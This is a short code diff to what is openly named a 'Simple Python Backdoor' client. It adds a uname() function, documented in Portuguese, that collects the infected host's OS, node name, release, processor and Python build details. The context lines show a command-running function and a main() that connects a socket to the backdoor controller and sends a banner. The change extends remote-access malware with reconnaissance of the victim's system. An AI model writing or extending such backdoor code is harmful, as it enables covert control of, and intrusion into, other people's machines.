@@ -58,6 +58,16 @@ def run_command(command):
     return command_output
 
 
+def uname():
+
+    """Este comando exibe informações sobre o sistema."""
+
+    return f'System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\n' \
+           f'Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\n' \
+           f'Python Version: {platform.python_version()}\nPython Compiler: {platform.python_compiler()}\n' \
+           f'Python Build: {platform.python_build()}'
+
+
 def main():
     _socket = simple_python_backdoor_client_connect()
     _socket.send(b'\n<==========Simple Python Backdoor=========>\n\n')
